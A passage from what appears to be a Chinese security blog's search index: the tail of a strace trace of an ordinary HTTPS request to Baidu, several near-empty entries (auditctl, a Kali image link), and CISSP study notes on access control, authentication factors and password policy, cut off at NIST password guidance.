escape_">\3</span>70q=<span class="hljs-char escape_">\2</span>01<span class="hljs-char escape_">\2</span>72<span class="hljs-char escape_">\3</span>22<span class="hljs-char escape_">\2</span>17<span class="hljs-char escape_">\2</span>61_<span class="hljs-char escape_">\3</span>64<span class="hljs-char escape_">\3</span>12<span class="hljs-char escape_">\2</span>73<span class="hljs-char escape_">\3</span>67C<span class="hljs-char escape_">\2</span>52&quot;</span>..., <span class="hljs-number">126</span>, <span class="hljs-number">0</span>, NULL, <span class="hljs-number">0</span>) <span class="hljs-operator">=</span> <span class="hljs-number">126</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x13150c0, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span> EAGAIN (Resource temporarily unavailable)<br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>4<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\1</span>&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\1</span>&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, NULL, NULL)     <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>6<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span>(&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\3</span>00<span class="hljs-char escape_">\2</span>1k<span class="hljs-char escape_">\3</span>26c<span class="hljs-char escape_">\2</span>44/<span class="hljs-char escape_">\2</span>32<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\3</span>02<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\2</span>45<span class="hljs-char escape_">\3</span>77<span class="hljs-char escape_">\6</span><span class="hljs-char escape_">\2</span>73<span class="hljs-char escape_">\3</span>04<span class="hljs-char escape_">\3</span>33<span class="hljs-char escape_">\2</span>36<span class="hljs-char escape_">\n</span>y<span class="hljs-char escape_">\2</span>56<span class="hljs-char escape_">\3</span>Y<span class="hljs-char escape_">\3</span>15&quot;</span>..., <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">40</span><br>sendto(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>7<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span>e<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\1</span><span class="hljs-char escape_">\3</span>60<span class="hljs-char escape_">\3</span>10<span class="hljs-char escape_">\3</span>32G<span class="hljs-char escape_">\3</span>21<span class="hljs-char escape_">\3</span>26z<span class="hljs-char escape_">\3</span>57<span class="hljs-char escape_">\2</span>17(x<span class="hljs-char escape_">\t</span><span class="hljs-char escape_">\3</span>26<span class="hljs-char escape_">\2</span>60<span class="hljs-char escape_">\1</span>6<span class="hljs-char escape_">\2</span>40u<span class="hljs-char escape_">\2</span>21<span class="hljs-char escape_">\3</span>31&quot;</span>..., <span class="hljs-number">106</span>, <span class="hljs-number">0</span>, NULL, <span class="hljs-number">0</span>) <span class="hljs-operator">=</span> <span class="hljs-number">106</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>7<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\4</span><span class="hljs-char escape_">\2</span>63&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\1</span><span class="hljs-char escape_">\2</span>7<span class="hljs-char escape_">\3</span>01<span class="hljs-char escape_">\2</span>00<span class="hljs-char escape_">\2</span>70<span class="hljs-char escape_">\3</span>04<span class="hljs-char escape_">\3</span>67<span class="hljs-char escape_">\2</span>51hS+<span class="hljs-char escape_">\3</span>44<span class="hljs-char escape_">\2</span>70kq<span class="hljs-char escape_">\2</span>34<span class="hljs-char escape_">\2</span>43L/<span class="hljs-char escape_">\3</span>11<span class="hljs-char escape_">\2</span>56%<span class="hljs-char escape_">\3</span>65<span class="hljs-char escape_">\\</span>%&quot;</span>..., <span class="hljs-number">1203</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">1203</span><br><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE html<span class="hljs-operator">&gt;</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>7<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\1</span><span class="hljs-char escape_">\3</span>5&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\2</span>16<span class="hljs-char escape_">\2</span>572I_<span class="hljs-char escape_">\3</span>32I8^3vM<span class="hljs-char escape_">\2</span>65<span class="hljs-char escape_">\2</span>64<span class="hljs-char escape_">\3</span>6f?@/<span class="hljs-char escape_">\v</span>^<span class="hljs-char escape_">\3</span>62<span class="hljs-char escape_">\3</span>42<span class="hljs-char escape_">\3</span>40&quot;</span>..., <span class="hljs-number">285</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">285</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>7<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\5</span><span class="hljs-char escape_">\2</span>23&quot;</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>recvfrom(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\2</span>37f+n<span class="hljs-char escape_">\2</span>0gT<span class="hljs-char escape_">\3</span>53<span class="hljs-char escape_">\2</span>57m+K<span class="hljs-char escape_">\5</span>fQ<span class="hljs-char escape_">\3</span>01<span class="hljs-char escape_">\3</span>3<span class="hljs-char escape_">\2</span>70<span class="hljs-char escape_">\\</span>`s<span class="hljs-char escape_">\2</span>34<span class="hljs-char escape_">\2</span>00&quot;</span>..., <span class="hljs-number">1427</span>, <span class="hljs-number">0</span>, NULL, NULL) <span class="hljs-operator">=</span> <span class="hljs-number">1427</span><br><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-operator">-</span>-STATUS OK-<span class="hljs-operator">-&gt;</span><span class="hljs-symbol">&lt;html&gt;</span> <span class="hljs-symbol">&lt;head&gt;</span><span class="hljs-operator">&lt;</span>meta http-equiv<span class="hljs-operator">=</span>content-type content<span class="hljs-operator">=</span>text<span class="hljs-symbol">/html</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>utf-<span class="hljs-number">8</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>meta http-equiv<span class="hljs-operator">=</span>X-UA-Compatible content<span class="hljs-operator">=</span>IE<span class="hljs-operator">=</span>Edge<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>meta content<span class="hljs-operator">=</span>always name<span class="hljs-operator">=</span>referrer<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>link rel<span class="hljs-operator">=</span>stylesheet type<span class="hljs-operator">=</span>text<span class="hljs-symbol">/css</span> href<span class="hljs-operator">=</span>https:<span class="hljs-operator">//</span>ss1.bdstatic.com<span class="hljs-operator">/</span><span class="hljs-number">5</span>eN1bjq8AAUYm2zgoY3K<span class="hljs-operator">/</span>r<span class="hljs-operator">/</span>www<span class="hljs-operator">/</span>cache<span class="hljs-operator">/</span>bdorz<span class="hljs-operator">/</span>baidu.min.css<span class="hljs-operator">&gt;</span><span class="hljs-symbol">&lt;title&gt;</span>百度一下，你就知道<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>title<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>head<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>body link<span class="hljs-operator">=</span><span class="hljs-comment">#0000cc&gt; &lt;div id=wrapper&gt; &lt;div id=head&gt; &lt;div class=head_wrapper&gt; &lt;div class=s_form&gt; &lt;div class=s_form_wrapper&gt; &lt;div id=lg&gt; &lt;img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270 height=129&gt; &lt;/div&gt; &lt;form id=form name=f action=//www.baidu.com/s class=fm&gt; &lt;input type=hidden name=bdorz_come value=1&gt; &lt;input type=hidden name=ie value=utf-8&gt; &lt;input type=hidden name=f value=8&gt; &lt;input type=hidden name=rsv_bp value=1&gt; &lt;input type=hidden name=rsv_idx value=1&gt; &lt;input type=hidden name=tn value=baidu&gt;&lt;span class=&quot;bg s_ipt_wr&quot;&gt;&lt;input id=kw name=wd class=s_ipt value maxlength=255 autocomplete=off autofocus=autofocus&gt;&lt;/span&gt;&lt;span class=&quot;bg s_btn_wr&quot;&gt;&lt;input type=submit id=su value=百度一下 class=&quot;bg s_btn&quot; autofocus&gt;&lt;/span&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=u1&gt; &lt;a href=http://news.baidu.com name=tj_trnews class=mnav&gt;新闻&lt;/a&gt; &lt;a href=https://www.hao123.com name=tj_trhao123 class=mnav&gt;hao123&lt;/a&gt; &lt;a href=http://map.baidu.com name=tj_trmap class=mnav&gt;地图&lt;/a&gt; &lt;a href=http://v.baidu.com name=tj_trvideo class=mnav&gt;视频&lt;/a&gt; &lt;a href=http://tieba.baidu.com name=tj_trtieba class=mnav&gt;贴吧&lt;/a&gt; &lt;noscript&gt; &lt;a href=http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name=tj_login class=lb&gt;登录&lt;/a&gt; &lt;/noscript&gt; &lt;script&gt;document.write(&#x27;&lt;a href=&quot;http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u=&#x27;+ encodeURIComponent(window.location.href+ (window.location.search === &quot;&quot; ? &quot;?&quot; : &quot;&amp;&quot;)+ &quot;bdorz_come=1&quot;)+ &#x27;&quot; name=&quot;tj_login&quot; class=&quot;lb&quot;&gt;登录&lt;/a&gt;&#x27;);</span><br>                <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-operator">//</span>www.baidu.com<span class="hljs-operator">/</span>more<span class="hljs-symbol">/</span> name<span class="hljs-operator">=</span>tj_briicon class<span class="hljs-operator">=</span>bri style<span class="hljs-operator">=</span><span class="hljs-string">&quot;display: block;&quot;</span><span class="hljs-operator">&gt;</span>更多产品<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>div id<span class="hljs-operator">=</span>ftCon<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>div id<span class="hljs-operator">=</span>ftConw<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>p id<span class="hljs-operator">=</span>lh<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span>http:<span class="hljs-operator">//</span>home.baidu.com<span class="hljs-operator">&gt;</span>关于百度<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span>http:<span class="hljs-operator">//</span>ir.baidu.com<span class="hljs-operator">&gt;</span>About Baidu<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>p<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span>p id<span class="hljs-operator">=</span>cp<span class="hljs-operator">&gt;</span>&amp;copy;<span class="hljs-number">2017</span>&amp;nbsp;Baidu&amp;nbsp;<span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span>http:<span class="hljs-operator">//</span>www.baidu.com<span class="hljs-operator">/</span>duty<span class="hljs-operator">/</span><span class="hljs-operator">&gt;</span>使用百度前必读<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span>&amp;nbsp; <span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span>http:<span class="hljs-operator">//</span>jianyi.baidu.com<span class="hljs-symbol">/</span> class<span class="hljs-operator">=</span>cp-feedback<span class="hljs-operator">&gt;</span>意见反馈<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span>&amp;nbsp;京ICP证<span class="hljs-number">030173</span>号&amp;nbsp; <span class="hljs-operator">&lt;</span>img src<span class="hljs-operator">=</span><span class="hljs-operator">//</span>www.baidu.com<span class="hljs-operator">/</span>img<span class="hljs-operator">/</span>gs.gif<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>p<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>body<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>html<span class="hljs-operator">&gt;</span><br>setsockopt(<span class="hljs-number">3</span>, SOL_TCP, TCP_NODELAY, [<span class="hljs-number">1</span>], <span class="hljs-number">4</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>sendto(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>5<span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\3</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\3</span>2<span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\0</span><span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\2</span>11<span class="hljs-char escape_">\2</span>11<span class="hljs-char escape_">\3</span>0r<span class="hljs-char escape_">\2</span>21<span class="hljs-char escape_">\2</span><span class="hljs-char escape_">\2</span>77<span class="hljs-char escape_">\2</span>64%<span class="hljs-char escape_">\2</span>16<span class="hljs-char escape_">\2</span>07<span class="hljs-char escape_">\3</span>57<span class="hljs-char escape_">\2</span>03UZ<span class="hljs-char escape_">\2</span>02<span class="hljs-char escape_">\2</span>40<span class="hljs-char escape_">\1</span>&quot;</span>, <span class="hljs-number">31</span>, <span class="hljs-number">0</span>, NULL, <span class="hljs-number">0</span>) <span class="hljs-operator">=</span> <span class="hljs-number">31</span><br><span class="hljs-operator">++</span><span class="hljs-operator">+</span> exited <span class="hljs-keyword">with</span> <span class="hljs-number">0</span> <span class="hljs-operator">++</span><span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><h1 id="autrace"><a href="#autrace" class="headerlink" title="autrace"></a>autrace</h1><p>a program similar to strace  类似 strace 的程序</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>audit_auditctl</title>
    <link href="/2025/04/08/security/osSec/os_monitor/audit_auditctl/"/>
    <url>/2025/04/08/security/osSec/os_monitor/audit_auditctl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/04/01/security/sectools/kali/kali_bases/"/>
    <url>/2025/04/01/security/sectools/kali/kali_bases/</url>
    
    <content type="html"><![CDATA[<p>镜像下载地址</p><p><a href="https://cdimage.kali.org/">https://cdimage.kali.org/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/27/security/mobilesec/mobilesec_deeplink/"/>
    <url>/2025/03/27/security/mobilesec/mobilesec_deeplink/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>13-域5身份和访问管理（IAM）-管理身份和认证</title>
    <link href="/2025/03/14/security/seccert/cissp/13-%E5%9F%9F5%E8%BA%AB%E4%BB%BD%E5%92%8C%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89-%E7%AE%A1%E7%90%86%E8%BA%AB%E4%BB%BD%E5%92%8C%E8%AE%A4%E8%AF%81/"/>
    <url>/2025/03/14/security/seccert/cissp/13-%E5%9F%9F5%E8%BA%AB%E4%BB%BD%E5%92%8C%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89-%E7%AE%A1%E7%90%86%E8%BA%AB%E4%BB%BD%E5%92%8C%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="13-1-控制对资产的访问"><a href="#13-1-控制对资产的访问" class="headerlink" title="13.1 控制对资产的访问"></a>13.1 控制对资产的访问</h1><p><strong>信息</strong> 包括组织的所有数据。可以存储在服务器、计算机和较小设备上的简单文件中。</p><p><strong>访问控制尝试阻止信息的未授权访问。</strong></p><p><strong>系统</strong> 提供一个或多个服务的任何 IT 系统。</p><p><strong>设备</strong> 指任何计算系统，包括服务器、台式计算机、笔记本电脑、平板电脑、智能手机和外部设备（如打印机）。</p><p><strong>员工自有设备接入阻止网络，虽然设备是员工的，但是设备上存储的组织数据仍然是组织的资产。</strong></p><p><strong>设施</strong> 包括组织拥有或租赁的任何物理场所。</p><p><strong>物理安全控制措施有助于保护设施。</strong></p><p><strong>应用程序</strong> 应用程序提供组织的数据访问。</p><p>应用程序的访问控制可以为组织的数据提供一个额外的控制层。</p><h2 id="13-1-1-物理控制和逻辑访问"><a href="#13-1-1-物理控制和逻辑访问" class="headerlink" title="13.1.1 物理控制和逻辑访问"></a>13.1.1 物理控制和逻辑访问</h2><p>通过物理安全控制和逻辑访问来实现资产保护。</p><p>物理安全控制是可以触摸到的，如围栏、大门等<strong>边界安全控制</strong>，以及供暖、通风和空调（HVAC）系统和灭火等<strong>环境控制</strong>。</p><p>物理安全控制通过控制访问和环境来保护系统、设备和设施。</p><p>逻辑访问控制是一种技术控制，用于保护对信息、系统、设备和应用程序的访问。</p><p>逻辑访问控制包括身份认证、授权和权限。</p><h2 id="13-1-1-CIA-三性和访问控制"><a href="#13-1-1-CIA-三性和访问控制" class="headerlink" title="13.1.1 CIA 三性和访问控制"></a>13.1.1 CIA 三性和访问控制</h2><p>组织实施访问控制机制的主要原因之一是<strong>预防损失</strong>。</p><p>IT 损失分为 3 类型：</p><p>保密性（confidentiality）损失</p><p>完整性（integrity）损失</p><p>可用性（availability）损失</p><p>即 CIA  损失。</p><p>CIA  也被称为 CIA 三性 、AIC 三性、安全三性。</p><p><strong>保密性</strong></p><p>访问控制有助于确保只有已经授权的主体能够访问客体。</p><p>如果未经授权的实体可以访问系统或数据，会导致保密性丢失。</p><p><strong>完整性</strong></p><p>完整性可以确保主体经过授权后才可以修改数据或系统配置，或如果发生未授权的变更，安全控制可以检测到变更。</p><p>如果客体发生了未授权的变更或不需要的变更，会导致完整性丢失。</p><p><strong>可用性</strong></p><p>必须在合理时间内向主体授予访问客体的权限。</p><p>如果系统无法运行或数据无法访问，会导致可用性降低。</p><h1 id="13-2-管理身份标识和认证"><a href="#13-2-管理身份标识和认证" class="headerlink" title="13.2 管理身份标识和认证"></a>13.2 管理身份标识和认证</h1><p><strong>身份标识（identification）</strong>时主体声明或宣称身份的过程。</p><p>主体必须向系统提供身份标识，从而启动身份认证、授权和问责流程。</p><p>身份认证的核心原则是所有主体必须具有唯一的身份标识。</p><p><strong>身份认证（authentication）</strong>将一个或多个因素与有效身份标识数据库（如用户账户）进行比对，从而验证主体的身份。</p><p>用于验证主体身份的认证信息是私有信息，需要进行保护。</p><p>身份标识和身份认证作为一个流程的两个步骤同时发生。第一步是提供身份标识，第二步是提供身份认证信息。</p><p>必须在部署环境的上下文中评估每种身份认证机制。</p><h2 id="13-2-1-比较主体和客体"><a href="#13-2-1-比较主体和客体" class="headerlink" title="13.2.1  比较主体和客体"></a>13.2.1  比较主体和客体</h2><p>访问控制是有关实体（即主体和客体）之间的关系。</p><p>访问是将信息从客体（object）传递到主体（subject）的过程。</p><p><strong>主体</strong>  主体是一种活动实体，访问被动客体以从客体接收信息或数据。</p><p>经过授权后，主体可以访问客体。</p><p><strong>客体</strong> 客体是一个被动实体，可以向活动主体提供信息。</p><p>主体和客体的角色可以来回切换。</p><p>主要区别：</p><p>主体始终是活动主体，接收被动客体的信息或数据</p><p>客体始终是提供或托管信息或数据的被动实体</p><h2 id="13-2-2-身份注册、证明和创建"><a href="#13-2-2-身份注册、证明和创建" class="headerlink" title="13.2.2 身份注册、证明和创建"></a>13.2.2 身份注册、证明和创建</h2><p>可接受的身份证明文件：护照、驾照、出生证明等实物文件。</p><p>组织通常使用基于知识的身份认证（KBA）来验证新人（如新客户）的身份。</p><p>组织通过查询独立且权威的数据，例如征信机构或政府机构，创建一些只有用户自己知道的多项选择题或填空题，并为用户提供有限的时间来回答问题。</p><p>已注册用户尝试更改口令时，某些组织会使用认知口令（也称为安全问题）</p><p>通过安全问题进行身份认证，不建议使用静态安全问题，答案容易从社交媒体网站或互联网上搜索获得。</p><h2 id="13-2-3-授权和问责"><a href="#13-2-3-授权和问责" class="headerlink" title="13.2.3 授权和问责"></a>13.2.3 授权和问责</h2><p>访问控制系统中的两个附加安全要素是授权（authorization）和问责（accountability）。</p><p><strong>授权</strong>  基于已验证的身份授予主体对客体的访问。</p><p><strong>问责</strong> 在实施审计时，用户和其他主体可以对其行为负责。</p><p>审计在主体访问客体时追踪主体和记录，并在一个或多个审计日志中创建审计轨迹。</p><p>审计提供问责机制。</p><p>当通过身份认证，审计日志可以提供不可否认性。</p><p>有效的访问控制系统：</p><p>授权（授予主体权限）</p><p>问责（审计）</p><p>身份标识（唯一）</p><p>认证机制（证明身份）</p><h3 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h3><p>授权表示可以信任谁来执行特定操作。</p><p>通过认证，不一定可以访问所有，但是可以访问特定。</p><p>授权过程可以根据主体获得的权限确保主体能够访问所请求的活动或对象。</p><p>管理员仅根据最小特权原则授予用户完成工作所需的权限。</p><p>身份标识和身份认证是访问控制的“全有或全无”方面。</p><h3 id="问责"><a href="#问责" class="headerlink" title="问责"></a>问责</h3><p>审计、日志记录和监控可以确保主体对其行为负责，进而实现问责机制。</p><p>审计是在日志跟踪和记录主体活动的过程。</p><p>日志通常记录谁执行某项操作，执行某项操作的时间和地点，以及操作内容。</p><p><strong>问责依赖于有效的身份标识和认证，但不需要有效的授权。</strong></p><h2 id="13-2-4-身份认证因素概述"><a href="#13-2-4-身份认证因素概述" class="headerlink" title="13.2.4 身份认证因素概述"></a>13.2.4 身份认证因素概述</h2><p><strong>你知道什么</strong> 该身份认证因素包括已记住的秘密</p><p>如口令、个人身份识别码（PIN）或口令短语。</p><p>早期文档将此称为<u>类型 1 身份认证因素</u>。</p><p><strong>你拥有什么</strong> 该身份认证因素包括用户拥有并可以帮忙其提供身份认证的物理设备</p><p>如 智能卡、硬件令牌、存储卡或通用串行总线（USB）驱动器。</p><p>早期文档将此称为 <u>类型 2 身份认证因素</u></p><p><strong>你是什么</strong> 该身份认证因素利用人的身体特征并基于生物识别技术。</p><p>如指纹、面部扫描、视网膜、虹膜和手掌扫描。</p><p>早期文档将此称为 <u>类型 3 身份认证因素</u></p><p>单因素身份认证仅使用一种身份认证因素。</p><p>多因素身份认证使用两个或多个身份认证因素。</p><p>“你知道什么”最弱，“你是什么”最强。</p><p>口令是最弱的身份认证形式，指纹比口令更强。</p><p>部分生物识别技术因素存在被绕过风险，例如：指纹可以被复制或伪造。</p><p><strong>你在什么地方</strong> 该身份认证因素基于具体计算机来识别主体所在的位置，主要通过 IP 地址或来电显示来识别地理位置。</p><p><strong>你不在什么地方</strong> 也可以通过用户长期所在位置来判断是否为合法请求，但是存在 VPN 来修改地址的绕过方法。</p><p><strong>上下文感知身份认证</strong> 许多移动设备管理（MDM）系统使用上下文感知身份认证来识别移动设备用户。</p><p>上下文感知身份认证可以识别多个属性，如用户位置、时段、移动设备等。</p><p>许多移动设备支持在触摸屏上使用手势或手指滑动。也被称为“<u>你做什么</u>”</p><h2 id="13-2-5-你知道什么"><a href="#13-2-5-你知道什么" class="headerlink" title="13.2.5 你知道什么"></a>13.2.5 你知道什么</h2><p>口令是用户输入的一串字符串，是最常见的身份认证技术。</p><p>口令通常是静态的，在一段时间内保持不变。</p><p>口令的安全风险如下：</p><ul><li>用户选择容易记住的口令，这种口令容易被猜测或破解。</li><li>随机生成的口令难以记忆，用户会将口令抄写下来。</li><li>用户经常共享口令或忘记口令。</li><li>攻击者可以通过多种方式查出口令，包括监视、网络嗅探和窃取数据库。</li><li>口令通过明文形式或容易破解的加密协议传输，可以通过使用网络嗅探器来捕获口令。</li><li>口令数据库有时存储在可公开访问的网络位置。</li><li>暴力破解攻击可以快速发现弱口令。</li></ul><p>口令短语（passphrase）是一种增强口令的方法。</p><p>口令短语的优势：</p><ul><li>非常容易记忆，用户可以创建更长的口令</li><li>暴力破解工具更难破解更长的口令</li><li>有助于确保用户不使用常见且可预测的口令</li></ul><p>个人身份识别码（PIN）也属于“你知道什么”类别。</p><p>PIN 通常包含 4 个、6 个或 8 个数字。</p><h3 id="1-口令策略组件"><a href="#1-口令策略组件" class="headerlink" title="1. 口令策略组件"></a>1. 口令策略组件</h3><p>强制实现口令限制要求的技术秘密策略。</p><p>常见的秘密策略设置</p><p><strong>最长期限</strong>  要求用户定期更改其口令。也称为口令过期。</p><p><strong>口令复杂度</strong>  口令复杂度是指口令包含几种字符类型。</p><p>小写字母、大写字母、数字和特殊字符均是不同类型的字符。</p><p>复杂口令使用三种或四种字符类型。</p><p><strong>口令长度</strong>  长度是指口令密码中的字符数，例如至少 8 个字符。</p><p><strong>最短期限</strong>  要求用户经过特定时间之后才可再次修改口令。</p><p>通常强制要求口令历史不少于 1 天。</p><p><strong>口令历史</strong> 记录一定数量的历史口令，防止用户重复使用口令。</p><h3 id="2-权威口令建议"><a href="#2-权威口令建议" class="headerlink" title="2. 权威口令建议"></a>2. 权威口令建议</h3><ul><li>NIST SP 800-63B ，“数字身份指南：身份认证和声明周期”</li><li>支付卡行业数据安全标准（PCI DSS）3.2.1 版</li></ul><h4 id="NIST-口令建议"><a href="#NIST-口令建议" class="headerlink" title="NIST 口令建议"></a>NIST 